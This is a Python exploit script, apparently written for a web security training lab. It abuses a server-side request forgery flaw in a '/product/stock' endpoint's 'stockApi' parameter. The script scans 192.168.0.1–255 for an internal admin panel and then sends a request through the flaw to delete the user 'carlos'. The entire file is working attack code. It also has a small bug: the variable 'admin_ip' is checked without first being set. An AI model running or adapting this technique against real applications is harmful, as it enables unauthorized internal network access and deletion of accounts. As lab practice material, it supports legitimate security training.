#!/usr/bin/python3
import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# this function is check and getting the admin panel ip to pass to delete_carlos fun
def getting_ip(url):
    # the vulnerable function path
    vulnerable_endpoint = '/product/stock'
    # loop to iterate and check status code if 200 ok return that ip
    for i in range(1, 256):
        # here the admin panel url
        admin_panel = 'http://192.168.0.%s:8080/admin' % i
        # request parameter
        sending_data = {'stockApi': admin_panel}
        # making a request using the current ip in the loop
        sending_request = requests.post(url + vulnerable_endpoint, data=sending_data, verify=False, proxies=proxies)
        # check status code
        if sending_request.status_code == 200:
            admin_ip = '192.168.0.%s' % i
            break
    # if the admin panel doesn't exist
    if admin_ip == '':
        print('[-] the admin panel does not exist')
    return admin_ip


# this function take the lab url and he url of the admin panel the purpose of that function do the action of exploit
def delete_carlos(url, admin_panel_ip):
    # the vulnerable function path
    vulnerable_endpoint = '/product/stock'
    payload = 'http://%s:8080/admin/delete?username=carlos' % admin_panel_ip
    sending_data = {'stockApi': payload}
    sending_request = requests.post(url + vulnerable_endpoint, data=sending_data, verify=False, proxies=proxies)
    # checking if the action done you need to visit the admin url
    admin_url = 'http://%s:8080/admin' % admin_panel_ip
    check_payload = {'stockApi': admin_url}
    check_request = requests.post(url + vulnerable_endpoint, data=check_payload, verify=False, proxies=proxies)
    # check if the response contain the text User deleted successfully that return from the server response after
    # deleting carlos
    if 'User deleted successfully' in check_request.text:
        print('[+] carlos deleted successfully')
    else:
        print("[-] Unexpected error occur")


def exploit():
    if len(sys.argv) != 2:
        print("[-] Unexpected error occur")
        print("[*] Usage of the script is: {} <your url>".format(sys.argv[0]))
        exit(-1)
    url = sys.argv[1]
    print("[+] check admin panel ip ")
    admin_panel_ip = getting_ip(url)
    print('[+] the admin url is ' + admin_panel_ip)
    delete_carlos(url, admin_panel_ip)


if __name__ == "__main__":
    exploit()
